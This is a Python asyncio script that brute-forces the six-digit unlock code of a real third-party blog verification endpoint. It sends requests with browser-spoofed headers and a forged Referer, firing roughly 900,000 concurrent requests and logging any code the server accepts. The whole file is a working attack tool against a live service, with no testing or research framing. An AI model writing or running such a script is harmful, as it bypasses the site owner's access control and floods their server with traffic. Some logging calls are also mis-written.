import aiohttp
import asyncio
import loguru

logger = loguru.logger


url = "https://my.openwrite.cn/code/check?blogId=15406-1578143418297-890&code={}"
header = {
    "accept": "*/*",
    "accept-language": "zh-CN,zh;q=0.9,ja;q=0.8,en;q=0.7",
    "cache-control": "no-cache",
    "pragma": "no-cache",
    "sec-ch-ua": "\"Not.A/Brand\";v=\"8\", \"Chromium\";v=\"114\", \"Google Chrome\";v=\"114\"",
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": "\"Windows\"",
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "cross-site",
    "Referer": "https://pycharm.iswbm.com/",
    "Referrer-Policy": "strict-origin-when-cross-origin"
}


async def main():
    async with aiohttp.ClientSession() as session:
        tasks = []
        for i in range(100000, 999999):
            tasks.append(asyncio.create_task(get_res(session, i)))
        await asyncio.wait(tasks)


async def get_res(session, pswd):
    async with session.get(url.format(pswd)) as response:
        logger.info("Status:", response.status)
        data = await response.json()
        status = data.get("status")
        if status == 'true':
            logger.info("Password:", data.get("data"))
        logger.info("Password:", status)


if __name__ == '__main__':
    loop = asyncio.get_event_loop()
    loop.run_until_complete(main())

